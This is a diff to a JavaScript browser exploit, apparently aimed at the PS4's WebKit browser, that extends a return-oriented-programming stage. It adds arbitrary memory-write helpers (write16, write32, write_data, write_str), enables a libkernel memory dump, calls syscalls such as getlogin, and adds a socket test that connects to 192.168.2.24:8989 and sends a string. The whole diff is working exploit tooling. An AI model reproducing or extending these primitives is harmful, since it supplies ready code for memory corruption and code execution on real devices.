@@ -323,14 +323,36 @@ window.stage2_ = function() {
     p.loadchain = launch_chain;
   
     
-     // Write to address with value (helper function)
-  this.write64 = function (addr, val) {
-    this.push(window.gadgets["pop rdi"]);
-    this.push(addr);
-    this.push(window.gadgets["pop rax"]);
-    this.push(val);
-    this.push(window.gadgets["mov [rdi], rax"]);
-  }
+    // Write to address with value (helper function)
+    this.write64 = function (addr, val) {
+        this.push(window.gadgets["pop rdi"]);
+        this.push(addr);
+        this.push(window.gadgets["pop rax"]);
+        this.push(val);
+        this.push(window.gadgets["mov [rdi], rax"]);
+    }
+
+    this.write32 = function(addr, val) {
+        this.write16(addr, val & 0xFFFF);
+        this.write16(addr.add32(0x2), (val >> 0x10) & 0xFFFF);
+    }
+
+    this.write16 = function(addr, val) {
+        p.write8(addr, val & 0xFF)
+        p.write8(addr.add32(0x1), (val >> 8) & 0xFF);
+    }
+
+    this.write_data = function(addr, u32array) {
+        for (var i = 0; i < u32array.length; i++) {
+            this.write32(addr.add32(i * 4), u32array[i]);
+        }
+    }
+
+    this.write_str = function(addr, str) {
+        for (var i = 0; i < str.length; i++) {
+            p.write8(addr.add32(i), str.charCodeAt(i));
+        }
+    }
    
     window.RopChain = function () {
         this.ropframe = new Uint32Array(0x10000);
@@ -826,7 +848,7 @@ function swapkeyval(json){
         }
     }
 
-    // dump('libkernel');
+    dump('libkernel');
     // dump('libSceWebKit2');
 
     var rtv1 = p.fcall(window.gadgets["mov rax, rdi"], 0x41414141);
@@ -834,11 +856,34 @@ function swapkeyval(json){
     var uid = p.syscall("getuid");
     print("all good. fcall test retval = " + rtv1 + " - uid: " + uid + " - pid: " + pid);
 
-    var lsscrtch32 = new Uint32Array(0x400);
-    var lsscrtch = p.read8(p.leakval(lsscrtch32).add32(0x10));
+    function getlogin() {
+        p.syscall("getlogin", this.ropframeptr, 17);
+        print("getlogin() returned " + p.readstr(this.ropframeptr));
+    }
+
+    getlogin();
+
+    window.socket_test = function(){
+        var s = socket();
+        print('socket() returned 0x' + s.toString(16));
+
+        var c = connect(s, "192.168.2.24", 8989);
+        print('connect() returned 0x' + c.toString(16));
+
+        var str_to_write = "Hello From a PS4!\n";
+        write_str(ropframeptr, str_to_write);
+
+        var bytes_written = write(s, ropframeptr, str_to_write.length);
+        print('write() returned 0x' + bytes_written.toString(16));
+    }
+
+    print("<a href=javascript:window.socket_test()>socket test</a>");
 
     window.ls = function(path)
     {
+        var lsscrtch32 = new Uint32Array(0x400);
+        var lsscrtch = p.read8(p.leakval(lsscrtch32).add32(0x10));
+
         var sep = "/"
         if (path[path.length-1]=="/") sep = "";
 
